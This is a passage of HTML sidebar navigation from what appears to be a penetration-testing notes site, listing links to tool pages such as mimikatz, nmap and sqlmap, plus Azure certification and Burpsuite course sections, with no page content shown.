      <a href="../john-the-ripper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    john the ripper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../jwt-tool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    jwt-tool
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerbrute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    kerbrute
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../keytabextract/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    keytabExtract
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kirbi2john/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    kirbi2john
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kiterunner/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    kiterunner
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../knockpy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    knockpy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laudanum/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    laudanum
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lazagne/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    lazagne
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ldap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ldap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linenum/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    linenum
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linikatz/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    linikatz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linpeas/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    linPEAS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../m365-cli/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    M365 CLI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mailsniper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mailsniper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../markdown/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    markdown
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mariadb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mariadb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../masscan/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    masscan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../medusa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    medusa
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    metasploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mimikatz/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mimikatz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mitm-relay/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mitm_relay
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mmc-console/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MMC Microsoft Management Console
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mobsf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mobsf
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mongo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mongo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../moodlescan/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    moodlescan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../msfvenom/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    msfvenom
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    msSQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mysql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mySQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mythic/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mythic
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nessus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nessus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../netcat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    netcat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../netcraft/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    netcraft
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../netdiscover/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    netdiscover
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nikto/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nikto
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nishang/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nishang
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nmap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../noip/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    noip
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nslookup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nslookup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o365spray/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    o365spray
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../objection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    objection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../odat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    odat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../onesixtyone/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    onesixtyone
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../openssl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    openSSL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../openvas/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    openVAS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../openvasreporting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    openVASreporting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ophcrack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ophcrack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../owasp-zap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    owasp-zap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../p0f/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    p0f
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pentesmonkey/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pentesmonkey
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pesecurity/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PeSecurity
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../phpggc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    phpggc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ping/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ping
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../postfix/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    postfix
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powercat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    powercat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powershell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    powershell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powerup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    powerup.ps1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powerupsql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    powerupsql
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powerview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    powerview.ps1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../process-hacker-tool/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    process hacker tool 2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../proxychains/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    proxychains
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../proxychains/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    proxychains
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pyftpdlib/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pyftpdlib
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pyinstaller/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pyinstaller
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pypykatz/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pypykatz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rdesktop/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    rdesktop
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../regex/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    regex
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../regshot/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    regshot
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../responder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    responder.py
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rpcclient/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    rpcclient
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rsat-remote-server-administration-tools/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RSAT Remote Server Administrations Tools
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rubeus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    rubeus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../samba-suite/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    samba suite
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../samrdump/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    samrdump
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../scrcpy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    scrcpy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../searchsploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    searchsploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../seatbelt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    seatbelt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sharpview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sharpview
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../smbclient/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    smbclient
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../smbmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    smbmap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../smbserver/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    smbserver
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../snaffler/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    snaffler
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../snmpwalk/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    snmpwalk
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shodan/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    shodan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sireprat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sirepRAT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqli-manual-attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sql injection (manual)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/sqlite-injections/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sqlite
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sqlmap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlplus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sqlplus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqsh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sqsh
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sslyze/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sslyze
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssh-audit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ssh-audit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssh-tunneling/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ssh tunneling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sshpass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sshpass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssh2john/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ssh2john
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sys-internals-suite/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sys internals suite
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../subfinder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    subfinder
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../subbrute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    subbrute
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sublist3r/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    sublist3r
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../swaks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    swaks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../tcpdump/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    tcpdump
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../the-harvester/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    the harvester
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../tmux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    tmux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../unshadow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    unshadow
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../uploadserver/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    uploadserver
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../username-anarchy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    username Anarchy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../veil/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    veil
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vim/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    vim
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vnstat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    vnstat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../w3af/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    w3af
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wafw00f/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    wafw00f
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../waybackurls/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    waybackurl
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webdav-wsgidav/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    webdav
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../weevely/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    weevely
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wget/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    wget
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rar-winrar/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    winrar
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wfuzz/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    wfuzz
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../whatweb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    whatweb
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../whitewinterwolf-webshell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    white winter wolf webshell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windapsearch/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    windapsearch
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../window-detective/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Window Detective
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../winfo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    winfo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../winpeas/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    winPEAS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../winspy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    winspy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wmctrl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    wmctrl
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wpscan/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    wpscan
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../xfreerdp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    xfreerdp
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../xsltproc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    xsltproc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../xsser/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    xsser
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../xxeinjector/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    xxeinjector
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ysoserial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ysoserial
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Courses and certificates
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Courses and certificates
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Az-900 Azure Fundamentals
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Az-900 Azure Fundamentals
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-900-preparation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Notes for the Az-900 exam
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-900-exams/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Exams- Practice the Az-900
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-104-preparation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Az-104 Microsoft Azure Administrator
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Az-500 Microsoft Azure Security Engineer
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Az-500 Microsoft Azure Security Engineer
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-500-preparation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Notes on the certification
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-500-ad-1-identity-and-access/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Identity and access
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-500-ad-2-platform-protection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Platform protection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-500-ad-3-data-and-applications/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Data and applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-500-ad-4-security-operations/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Security operations
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-500-keep-learning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Keep learning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-500-exams/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Questions for the exam
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Burpsuite
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
